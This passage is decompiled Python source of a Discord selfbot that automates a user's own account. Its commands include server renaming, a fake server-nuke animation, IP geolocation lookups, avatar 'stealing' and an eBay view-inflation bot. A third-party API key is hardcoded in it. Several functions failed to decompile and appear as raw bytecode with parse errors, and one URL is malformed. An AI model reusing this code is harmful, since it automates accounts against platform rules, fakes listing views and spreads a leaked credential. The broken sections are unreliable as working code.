    embed.set_footer(text='Copyright © elari#0001 ', icon_url='https://cdn.discordapp.com/attachments/722157826629304431/753771704815190147/image0.gif')
    await beaters.send(embed=embed)
    await beaters.message.delete()


@SIX.command(aliases=['renameserver', 'nameserver'])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@SIX.command()
async def about(beaters):
    embed = discord.Embed(title='About 6ix Selfbot :heart:', description='Developer: elari#0001\nWebsite: https://github.com/elarii/6ix-selfbot-version-4 Python\nVersion: 3.8.0', color=0)
    embed.set_footer(text='6ix selfbot ', icon_url='https://cdn.discordapp.com/attachments/722157826629304431/753771704815190147/image0.gif')
    await beaters.send(embed=embed)
    await beaters.message.delete()


@SIX.command(description='Coronavirus Stats')
async def covid--- This code section failed: ---

 L.1347         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1348        16  LOAD_CONST               0
               18  STORE_FAST               'num'

 L.1349        20  LOAD_GLOBAL              aiohttp
               22  LOAD_METHOD              ClientSession
               24  CALL_METHOD_0         0  ''
               26  STORE_FAST               'session'

 L.1350        28  LOAD_FAST                'ctx'
               30  LOAD_METHOD              typing
               32  CALL_METHOD_0         0  ''
               34  BEFORE_ASYNC_WITH
               36  GET_AWAITABLE    
               38  LOAD_CONST               None
               40  YIELD_FROM       
               42  SETUP_ASYNC_WITH    106  'to 106'
               44  POP_TOP          

 L.1351        46  LOAD_FAST                'session'
               48  LOAD_METHOD              get
               50  LOAD_STR                 'https://api.covid19api.com/summary'
               52  CALL_METHOD_1         1  ''
               54  BEFORE_ASYNC_WITH
               56  GET_AWAITABLE    
               58  LOAD_CONST               None
               60  YIELD_FROM       
               62  SETUP_ASYNC_WITH     90  'to 90'
               64  STORE_FAST               'r'

 L.1352        66  LOAD_GLOBAL              json
               68  LOAD_METHOD              loads
               70  LOAD_FAST                'r'
               72  LOAD_METHOD              text
               74  CALL_METHOD_0         0  ''
               76  GET_AWAITABLE    
               78  LOAD_CONST               None
               80  YIELD_FROM       
               82  CALL_METHOD_1         1  ''
               84  STORE_FAST               'formatted_json'
               86  POP_BLOCK        
               88  BEGIN_FINALLY    
             90_0  COME_FROM_ASYNC_WITH    62  '62'
               90  WITH_CLEANUP_START
               92  GET_AWAITABLE    
               94  LOAD_CONST               None
               96  YIELD_FROM       
               98  WITH_CLEANUP_FINISH
              100  END_FINALLY      
              102  POP_BLOCK        
              104  BEGIN_FINALLY    
            106_0  COME_FROM_ASYNC_WITH    42  '42'
              106  WITH_CLEANUP_START
              108  GET_AWAITABLE    
              110  LOAD_CONST               None
              112  YIELD_FROM       
              114  WITH_CLEANUP_FINISH
              116  END_FINALLY      

 L.1353       118  LOAD_FAST                'session'
              120  LOAD_METHOD              close
              122  CALL_METHOD_0         0  ''
              124  GET_AWAITABLE    
              126  LOAD_CONST               None
              128  YIELD_FROM       
              130  POP_TOP          

 L.1354       132  LOAD_FAST                'area'
              134  LOAD_METHOD              lower
              136  CALL_METHOD_0         0  ''
              138  LOAD_STR                 'global'
              140  COMPARE_OP               ==
              142  POP_JUMP_IF_TRUE    218  'to 218'

 L.1355       144  LOAD_FAST                'formatted_json'
              146  LOAD_STR                 'Countries'
              148  BINARY_SUBSCR    
              150  GET_ITER         
            152_0  COME_FROM           214  '214'
            152_1  COME_FROM           212  '212'
            152_2  COME_FROM           210  '210'
            152_3  COME_FROM           176  '176'
              152  FOR_ITER            216  'to 216'
              154  STORE_FAST               'i'

 L.1356       156  LOAD_FAST                'num'
              158  LOAD_CONST               1
              160  INPLACE_ADD      
              162  STORE_FAST               'num'

 L.1357       164  LOAD_FAST                'i'
              166  LOAD_STR                 'Slug'
              168  BINARY_SUBSCR    
              170  LOAD_FAST                'area'
              172  LOAD_ATTR                lower
              174  COMPARE_OP               ==
              176  POP_JUMP_IF_FALSE_BACK   152  'to 152'

 L.1358       178  LOAD_FAST                'i'
              180  LOAD_FAST                'num'
              182  LOAD_CONST               1
              184  BINARY_SUBTRACT  
              186  BINARY_SUBSCR    
              188  STORE_FAST               'formatted_json'

 L.1359       190  LOAD_FAST                'ctx'
              192  LOAD_METHOD              send
              194  LOAD_FAST                'formatted_json'
              196  CALL_METHOD_1         1  ''
              198  GET_AWAITABLE    
              200  LOAD_CONST               None
              202  YIELD_FROM       
              204  POP_TOP          

 L.1360       206  POP_TOP          
              208  BREAK_LOOP          226  'to 226'
              210  CONTINUE            152  'to 152'

 L.1362       212  CONTINUE            152  'to 152'
              214  JUMP_BACK           152  'to 152'
            216_0  COME_FROM           152  '152'
              216  JUMP_FORWARD        226  'to 226'
            218_0  COME_FROM           142  '142'

 L.1364       218  LOAD_FAST                'formatted_json'
              220  LOAD_STR                 'Global'
              222  BINARY_SUBSCR    
              224  STORE_FAST               'formatted_json'
            226_0  COME_FROM           216  '216'
            226_1  COME_FROM           208  '208'

 L.1365       226  LOAD_GLOBAL              discord
              228  LOAD_ATTR                Embed
              230  LOAD_STR                 'Covid 19 Stats ('
              232  LOAD_FAST                'area'
              234  LOAD_METHOD              title
              236  CALL_METHOD_0         0  ''
              238  FORMAT_VALUE          0  ''
              240  LOAD_STR                 ')'
              242  BUILD_STRING_3        3 
              244  LOAD_GLOBAL              discord
              246  LOAD_METHOD              Colour
              248  LOAD_GLOBAL              random
              250  LOAD_METHOD              randint
              252  LOAD_CONST               0
              254  LOAD_CONST               16777215
              256  CALL_METHOD_2         2  ''
              258  CALL_METHOD_1         1  ''
              260  LOAD_FAST                'ctx'
              262  LOAD_ATTR                message
              264  LOAD_ATTR                created_at
              266  LOAD_CONST               ('title', 'colour', 'timestamp')
              268  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              270  STORE_FAST               'embed'

 L.1366       272  LOAD_FAST                'embed'
              274  LOAD_ATTR                add_field
              276  LOAD_STR                 'New Cases'
              278  LOAD_FAST                'formatted_json'
              280  LOAD_STR                 'NewConfirmed'
              282  BINARY_SUBSCR    
              284  LOAD_STR                 ','
              286  FORMAT_VALUE_ATTR     4  ''
              288  LOAD_CONST               False
              290  LOAD_CONST               ('name', 'value', 'inline')
              292  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              294  POP_TOP          

 L.1367       296  LOAD_FAST                'embed'
              298  LOAD_ATTR                add_field
              300  LOAD_STR                 'Total Cases'
              302  LOAD_FAST                'formatted_json'
              304  LOAD_STR                 'TotalConfirmed'
              306  BINARY_SUBSCR    
              308  LOAD_STR                 ','
              310  FORMAT_VALUE_ATTR     4  ''
              312  LOAD_CONST               False
              314  LOAD_CONST               ('name', 'value', 'inline')
              316  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              318  POP_TOP          

 L.1368       320  LOAD_FAST                'embed'
              322  LOAD_ATTR                add_field
              324  LOAD_STR                 'New Deaths'
              326  LOAD_FAST                'formatted_json'
              328  LOAD_STR                 'NewDeaths'
              330  BINARY_SUBSCR    
              332  LOAD_STR                 ','
              334  FORMAT_VALUE_ATTR     4  ''
              336  LOAD_CONST               False
              338  LOAD_CONST               ('name', 'value', 'inline')
              340  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              342  POP_TOP          

 L.1369       344  LOAD_FAST                'embed'
              346  LOAD_ATTR                add_field
              348  LOAD_STR                 'Total Deaths'
              350  LOAD_FAST                'formatted_json'
              352  LOAD_STR                 'TotalDeaths'
              354  BINARY_SUBSCR    
              356  LOAD_STR                 ','
              358  FORMAT_VALUE_ATTR     4  ''
              360  LOAD_CONST               False
              362  LOAD_CONST               ('name', 'value', 'inline')
              364  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              366  POP_TOP          

 L.1370       368  LOAD_FAST                'embed'
              370  LOAD_ATTR                add_field
              372  LOAD_STR                 'New Recovered'
              374  LOAD_FAST                'formatted_json'
              376  LOAD_STR                 'NewRecovered'
              378  BINARY_SUBSCR    
              380  LOAD_STR                 ','
              382  FORMAT_VALUE_ATTR     4  ''
              384  LOAD_CONST               False
              386  LOAD_CONST               ('name', 'value', 'inline')
              388  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              390  POP_TOP          

 L.1371       392  LOAD_FAST                'embed'
              394  LOAD_ATTR                add_field
              396  LOAD_STR                 'Total Recovered'
              398  LOAD_FAST                'formatted_json'
              400  LOAD_STR                 'TotalRecovered'
              402  BINARY_SUBSCR    
              404  LOAD_STR                 ','
              406  FORMAT_VALUE_ATTR     4  ''
              408  LOAD_CONST               False
              410  LOAD_CONST               ('name', 'value', 'inline')
              412  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              414  POP_TOP          

 L.1372       416  LOAD_FAST                'embed'
              418  LOAD_ATTR                set_footer
              420  LOAD_STR                 '6ix selfbot'
              422  LOAD_FAST                'ctx'
              424  LOAD_ATTR                author
              426  LOAD_ATTR                avatar_url
              428  LOAD_CONST               ('text', 'icon_url')
              430  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              432  POP_TOP          

 L.1373       434  LOAD_FAST                'ctx'
              436  LOAD_ATTR                send
              438  LOAD_FAST                'embed'
              440  LOAD_CONST               ('embed',)
              442  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              444  GET_AWAITABLE    
              446  LOAD_CONST               None
              448  YIELD_FROM       
              450  POP_TOP          

Parse error at or near `COME_FROM_ASYNC_WITH' instruction at offset 106_0


@SIX.command(aliases=['urbandict', 'urbandefine', 'urbandefinition', 'ud', 'urbandictionary'])
async def urban--- This code section failed: ---

 L.1377         0  LOAD_STR                 'term'
                2  LOAD_FAST                'args'
                4  BUILD_MAP_1           1 
                6  STORE_FAST               'params'

 L.1378         8  LOAD_STR                 'mashape-community-urban-dictionary.p.rapidapi.com'
               10  LOAD_STR                 '1cae29cc50msh4a78ebc8d0ba862p17824ejsn020a7c093c4d'
               12  LOAD_CONST               ('x-rapidapi-host', 'x-rapidapi-key')
               14  BUILD_CONST_KEY_MAP_2     2 
               16  STORE_FAST               'headers'

 L.1379        18  LOAD_CONST               0
               20  STORE_FAST               'num'

 L.1380        22  LOAD_GLOBAL              discord
               24  LOAD_ATTR                Embed
               26  LOAD_FAST                'ctx'
               28  LOAD_ATTR                message
               30  LOAD_ATTR                created_at
               32  LOAD_GLOBAL              discord
               34  LOAD_METHOD              Colour
               36  LOAD_GLOBAL              random
               38  LOAD_METHOD              randint
               40  LOAD_CONST               0
               42  LOAD_CONST               16777215
               44  CALL_METHOD_2         2  ''
               46  CALL_METHOD_1         1  ''
               48  LOAD_CONST               ('timestamp', 'colour')
               50  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               52  STORE_FAST               'embed'

 L.1381        54  LOAD_FAST                'embed'
               56  LOAD_ATTR                set_footer
               58  LOAD_STR                 '6ix selfbot'
               60  LOAD_FAST                'ctx'
               62  LOAD_ATTR                author
               64  LOAD_ATTR                avatar_url
               66  LOAD_CONST               ('text', 'icon_url')
               68  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               70  POP_TOP          

 L.1382        72  LOAD_FAST                'ctx'
               74  LOAD_METHOD              typing
               76  CALL_METHOD_0         0  ''
               78  BEFORE_ASYNC_WITH
               80  GET_AWAITABLE    
               82  LOAD_CONST               None
               84  YIELD_FROM       
               86  SETUP_ASYNC_WITH    284  'to 284'
               88  POP_TOP          

 L.1383        90  LOAD_GLOBAL              requests
               92  LOAD_ATTR                get
               94  LOAD_STR                 'https://mashape-community-urban-dictionary.p.rapidapi.com/define'
               96  LOAD_FAST                'params'
               98  LOAD_FAST                'headers'
              100  LOAD_CONST               ('params', 'headers')
              102  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              104  STORE_FAST               'response'

 L.1384       106  SETUP_FINALLY       236  'to 236'

 L.1385       108  LOAD_GLOBAL              json
              110  LOAD_METHOD              loads
              112  LOAD_FAST                'response'
              114  LOAD_ATTR                text
              116  CALL_METHOD_1         1  ''
              118  STORE_FAST               'parsed_json'

 L.1386       120  LOAD_FAST                'parsed_json'
              122  LOAD_METHOD              get
              124  LOAD_STR                 'list'
              126  CALL_METHOD_1         1  ''
              128  STORE_FAST               'data'

 L.1387       130  LOAD_FAST                'data'
              132  GET_ITER         
            134_0  COME_FROM           230  '230'
            134_1  COME_FROM           206  '206'
              134  FOR_ITER            232  'to 232'
              136  STORE_FAST               'i'

 L.1388       138  LOAD_FAST                'num'
              140  LOAD_CONST               1
              142  INPLACE_ADD      
              144  STORE_FAST               'num'

 L.1389       146  LOAD_GLOBAL              len
              148  LOAD_FAST                'i'
              150  LOAD_METHOD              get
              152  LOAD_STR                 'definition'
              154  CALL_METHOD_1         1  ''
              156  CALL_FUNCTION_1       1  ''
              158  LOAD_CONST               1024
              160  COMPARE_OP               >
              162  POP_JUMP_IF_TRUE    208  'to 208'

 L.1390       164  LOAD_FAST                'embed'
              166  LOAD_ATTR                add_field
              168  LOAD_STR                 'Definition '
              170  LOAD_FAST                'num'
              172  FORMAT_VALUE          0  ''
              174  BUILD_STRING_2        2 
              176  LOAD_FAST                'i'
              178  LOAD_METHOD              get
              180  LOAD_STR                 'definition'
              182  CALL_METHOD_1         1  ''
              184  LOAD_METHOD              replace
              186  LOAD_STR                 '['
              188  LOAD_STR                 '**'
              190  CALL_METHOD_2         2  ''
              192  LOAD_METHOD              replace
              194  LOAD_STR                 ']'
              196  LOAD_STR                 '**'
              198  CALL_METHOD_2         2  ''
              200  LOAD_CONST               ('name', 'value')
              202  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              204  POP_TOP          
              206  JUMP_BACK           134  'to 134'
            208_0  COME_FROM           162  '162'

 L.1392       208  LOAD_FAST                'embed'
              210  LOAD_ATTR                add_field
              212  LOAD_GLOBAL              definition
              214  LOAD_CONST               0
              216  LOAD_CONST               1024
              218  BUILD_SLICE_2         2 
              220  BINARY_SUBSCR    
              222  LOAD_STR                 '\u200c'
              224  LOAD_CONST               ('name', 'value')
              226  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              228  POP_TOP          
              230  JUMP_BACK           134  'to 134'
            232_0  COME_FROM           134  '134'
              232  POP_BLOCK        
              234  JUMP_FORWARD        262  'to 262'
            236_0  COME_FROM_FINALLY   106  '106'

 L.1393       236  POP_TOP          
              238  POP_TOP          
              240  POP_TOP          

 L.1394       242  LOAD_FAST                'embed'
              244  LOAD_ATTR                add_field
              246  LOAD_STR                 'Error Occured'
              248  LOAD_STR                 'Command Aborted'
              250  LOAD_CONST               ('name', 'value')
              252  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              254  POP_TOP          
              256  POP_EXCEPT       
              258  JUMP_FORWARD        262  'to 262'
              260  END_FINALLY      
            262_0  COME_FROM           258  '258'
            262_1  COME_FROM           234  '234'

 L.1395       262  LOAD_FAST                'ctx'
              264  LOAD_ATTR                send
              266  LOAD_FAST                'embed'
              268  LOAD_CONST               ('embed',)
              270  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              272  GET_AWAITABLE    
              274  LOAD_CONST               None
              276  YIELD_FROM       
              278  POP_TOP          
              280  POP_BLOCK        
              282  BEGIN_FINALLY    
            284_0  COME_FROM_ASYNC_WITH    86  '86'
              284  WITH_CLEANUP_START
              286  GET_AWAITABLE    
              288  LOAD_CONST               None
              290  YIELD_FROM       
              292  WITH_CLEANUP_FINISH
              294  END_FINALLY      

Parse error at or near `COME_FROM_ASYNC_WITH' instruction at offset 284_0


@SIX.command()
async def wizz(ctx):
    await ctx.message.delete()
    PORN = ['`give me 3 seconds cuz i gotta nut and fuck up`' + ctx.guild.name, '`Deleting this server shitty Roles...\n`', '`Deleting this server shitty Roles...\nDeleting this server Text Channels...\n`', '`Deleting this server shitty Roles...\nDeleting this server shitty Text Channels...\nDeleting this server shitty Voice Channels...\n`', '`Deleting this server shitty Roles...\nDeleting this server shitty Text Channels...\nDeleting this server shitty Voice Channels...\nDeleting this server shitty Categories...\n`', '`Deleting this server shitty Roles...\nDeleting this server shitty Text Channels...\nDeleting this server shitty Voice Channels...\nDeleting this server shitty Categories...\nDeleting this server shitty Webhooks...\n`', '`Deleting this server shitty Roles...\nDeleting this server shitty Text Channels...\nDeleting this server shitty Voice Channels...\nDeleting this server shitty Categories...\nDeleting this server shitty Webhooks...\nDeleting this server shitty Emojis...\n`', '`Deleting this server shitty Roles...\nDeleting this server shitty Text Channels...\nDeleting this server shitty Voice Channels...\nDeleting this server shitty Categories...\nDeleting this server shitty Webhooks...\nDeleting this server shitty Emojis...\nInitiating Banwave...\n`', '`Deleting this server shitty Roles...\nDeleting this server shitty Text Channels...\nDeleting this server shitty Voice Channels...\nDeleting this server shitty Categories...\nDeleting this server shitty Webhooks...\nDeleting this server shitty Emojis...\nInitiating Banwave...\nInitializing Mass-DM Advertise...`']
    message = await ctx.send(PORN[0])
    await asyncio.sleep(2)
    for _next in PORN[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)


@SIX.command(aliases=['shorteen'])
async def bitly(ctx, *, link):
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Bitly API key has not been set in the config.json file" + Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}") as req:
                    r = await req.read()
                    r = json.loads(r)
            new = r['data']['url']
            em = discord.Embed(color=(discord.Color(random.randint(0, 16777215))))
            em.add_field(name='Shortened link', value=new, inline=False)
            await ctx.send(embed=em)
        except Exception as e:
            try:
                print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        else:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{req.text}" + Fore.RESET)


@SIX.command()
async def cuttly(ctx, *, link):
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Cutt.ly API key has not been set in the config.json file" + Fore.RESET)
    else:
        try:
            req = requests.get(f"https://cutt.ly/api/api.php?key={cuttly_key}&short={link}")
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)

        except Exception as e:
            try:
                print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        else:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{req.text}" + Fore.RESET)


@SIX.command()
async def cat(ctx):
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}Cat API key has not been set in the config.json file" + Fore.RESET)
    else:
        try:
            req = requests.get(f"fhttps://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=(str(r[0]['url'])))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]['url']))

        except Exception as e:
            try:
                print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        else:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{req.text}" + Fore.RESET)


@SIX.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get('https://dog.ceo/api/breeds/image/random').json()
    em = discord.Embed(color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(str(r['message'])))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))


@SIX.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title='Random fox image', color=(discord.Color(random.randint(0, 16777215))))
    em.set_image(url=(r['image']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])


@SIX.command()
async def encode(ctx, string):
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff) - 1]
    await ctx.send(encoded_stuff)


@SIX.command()
async def decode(ctx, string):
    await ctx.message.delete()
    strOne = string.encode('ascii')
    pad = len(strOne) % 4
    strOne += b'=' * pad
    encoded_stuff = codecs.decode(strOne.strip(), 'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff) - 1]
    await ctx.send(decoded_stuff)


@SIX.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
async def _ebay_view(ctx, url, views: int):
    await ctx.message.delete()
    start_time = datetime.datetime.now()

    def EbayViewer(url, views):
        headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
        for _i in range(views):
            requests.get(url, headers=headers)

    EbayViewer(url, views)
    elapsed_time = datetime.datetime.now() - start_time
    em = discord.Embed(title='Ebay View Bot', color=(discord.Color(random.randint(0, 16777215))))
    em.add_field(name='Views sent', value=views, inline=False)
    em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
    await ctx.send(embed=em)


@SIX.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str='1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
    geo = r.json()
    em = discord.Embed(color=(discord.Color(random.randint(0, 16777215))))
    fields = [
     {'name':'IP', 
      'value':geo['query']},
     {'name':'ipType', 
      'value':geo['ipType']},
     {'name':'Country', 
      'value':geo['country']},
     {'name':'City', 
      'value':geo['city']},
     {'name':'Continent', 
      'value':geo['continent']},
     {'name':'Country', 
      'value':geo['country']},
     {'name':'IPName', 
      'value':geo['ipName']},
     {'name':'ISP', 
      'value':geo['isp']},
     {'name':'Latitute', 
      'value':geo['lat']},
     {'name':'Longitude', 
      'value':geo['lon']},
     {'name':'Org', 
      'value':geo['org']},
     {'name':'Region', 
      'value':geo['region']},
     {'name':'Status', 
      'value':geo['status']}]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']), value=(field['value']), inline=True)
    else:
        return await ctx.send(embed=em)


@SIX.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            try:
                print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        else:
            if r == 404:
                await ctx.send(f"Site is down, responded with a status code of {r}", delete_after=3)
            else:
                await ctx.send(f"Site is up, responded with a status code of {r}", delete_after=3)


@SIX.command()
async def tweet(ctx, username: str, *, message: str):
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed(color=(discord.Color(random.randint(0, 16777215))))
            em.set_image(url=(res['message']))
            await ctx.send(embed=em)


@SIX.command(name='tinder', aliases=['match'])
async def tinder(ctx):
    await ctx.message.delete()
    try:
        user1 = ctx.message.mentions[0].avatar_url_as(size=1024)
        user2 = ctx.message.mentions[1].avatar_url_as(size=1024)
    except IndexError:
        return await ctx.send('Mention two users to match :heart:')
    else:
        em = discord.Embed(color=(discord.Color(16725342)))
        em.set_image(url=f"https://useless-api--vierofernando.repl.co/tinder?image1={user1}&image2={user2}")
        await ctx.send(embed=em)


@SIX.command()
async def revav(ctx, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        try:
            print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
        finally:
            e = None
            del e


@SIX.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    em = discord.Embed(author=(user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_author(name=(str(user) + "'s pfp"))
    em.set_image(url=(user.avatar_url))
    await ctx.send(embed=em)


@SIX.command(aliases=['ri', 'role'])
async def roleinfo(ctx, *, role: discord.Role):
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime('%d %b %Y %H:%M')
    created_on = '{} ({} days ago)'.format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == '#000000':
        colour = 'default'
        color = '#%06x' % random.randint(0, 16777215)
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}\nRole ID: {role.id}")
    em.add_field(name='Users', value=users)
    em.add_field(name='Mentionable', value=(role.mentionable))
    em.add_field(name='Hoist', value=(role.hoist))
    em.add_field(name='Position', value=(role.position))
    em.add_field(name='Managed', value=(role.managed))
    em.add_field(name='Colour', value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)


@SIX.command()
async def whois(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    date_format = '%a, %d %b %Y %I:%M %p'
    em = discord.Embed(description=(user.mention), color=(discord.Color(random.randint(0, 16777215))))
    em.set_author(name=(str(user)), icon_url=(user.avatar_url))
    em.set_thumbnail(url=(user.avatar_url))
    em.add_field(name='Joined', value=(user.joined_at.strftime(date_format)))
    members = sorted((ctx.guild.members), key=(lambda m: m.joined_at))
    em.add_field(name='Join position', value=(str(members.index(user) + 1)))
    em.add_field(name='Registered', value=(user.created_at.strftime(date_format)))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name=('Roles [{}]'.format(len(user.roles) - 1)), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace('_', ' ').title() for p in user.guild_permissions if p[1]])
    em.add_field(name='Guild permissions', value=perm_string, inline=False)
    em.set_footer(text=('ID: ' + str(user.id)))
    return await ctx.send(embed=em)


@SIX.command()
async def combine(ctx, name1, name2):
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = ''.join([name1letters, name2letters])
    emb = discord.Embed(description=(f"{ship}"), color=(discord.Color(random.randint(0, 16777215))))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)


@SIX.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text):
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3').replace('E', '3').replace('i', '!').replace('I', '!').replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f"`{text}`")


@SIX.command(aliases=['dvwl'])
async def devowel(ctx, *, text):
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '').replace('E', '').replace('i', '').replace('I', '').replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)


@SIX.command()
async def blank(ctx):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] LIGHTYELLOW_EXYou didnt put your password in the config.json file" + Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
            try:
                await SIX.user.edit(password=password, username='ٴٴٴٴ', avatar=(f.read()))
            except discord.HTTPException as e:
                try:
                    print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{e}" + Fore.RESET)
                finally:
                    e = None
                    del e


@SIX.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal--- This code section failed: ---

 L.1700         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1701        16  LOAD_GLOBAL              config
               18  LOAD_METHOD              get
               20  LOAD_STR                 'password'
               22  CALL_METHOD_1         1  ''
               24  LOAD_STR                 'password-here'
               26  COMPARE_OP               ==
               28  POP_JUMP_IF_FALSE    54  'to 54'

 L.1702        30  LOAD_GLOBAL              print
               32  LOAD_GLOBAL              Fore
               34  LOAD_ATTR                RED
               36  FORMAT_VALUE          0  ''
               38  LOAD_STR                 '[ERROR] LIGHTYELLOW_EXYou didnt put your password in the config.json file'
               40  BUILD_STRING_2        2 
               42  LOAD_GLOBAL              Fore
               44  LOAD_ATTR                RESET
               46  BINARY_ADD       
               48  CALL_FUNCTION_1       1  ''
               50  POP_TOP          
               52  JUMP_FORWARD        276  'to 276'
             54_0  COME_FROM            28  '28'

 L.1704        54  LOAD_GLOBAL              config
               56  LOAD_METHOD              get
               58  LOAD_STR                 'password'
               60  CALL_METHOD_1         1  ''
               62  STORE_FAST               'password'

 L.1705        64  LOAD_GLOBAL              open
               66  LOAD_STR                 'Images/Avatars/Stolen/Stolen.png'
               68  LOAD_STR                 'wb'
               70  CALL_FUNCTION_2       2  ''
               72  SETUP_WITH          130  'to 130'
               74  STORE_FAST               'f'

 L.1706        76  LOAD_GLOBAL              requests
               78  LOAD_ATTR                get
               80  LOAD_FAST                'user'
               82  LOAD_ATTR                avatar_url
               84  LOAD_CONST               True
               86  LOAD_CONST               ('stream',)
               88  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               90  STORE_FAST               'r'

